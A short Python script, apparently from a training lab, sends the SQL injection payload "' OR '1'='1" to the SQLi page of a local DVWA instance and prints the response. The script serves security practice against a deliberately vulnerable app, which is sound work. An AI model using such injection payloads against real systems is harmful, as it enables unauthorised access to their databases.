
from attacks.common import create_session, send_request, display_result


ENDPOINT = "/vulnerabilities/sqli/"


def run_sqli_test():
    print("\n[SQLi] Starting local SQL injection test")

    session = create_session()

    # Controlled test payload for the local DVWA application.
    payload = "' OR '1'='1"

    params = {
        "id": payload,
        "Submit": "Submit"
    }

    response = send_request(
        session=session,
        endpoint=ENDPOINT,
        params=params
    )

    display_result("SQL Injection Test", response)

    session.close()


if __name__ == "__main__":
    run_sqli_test()
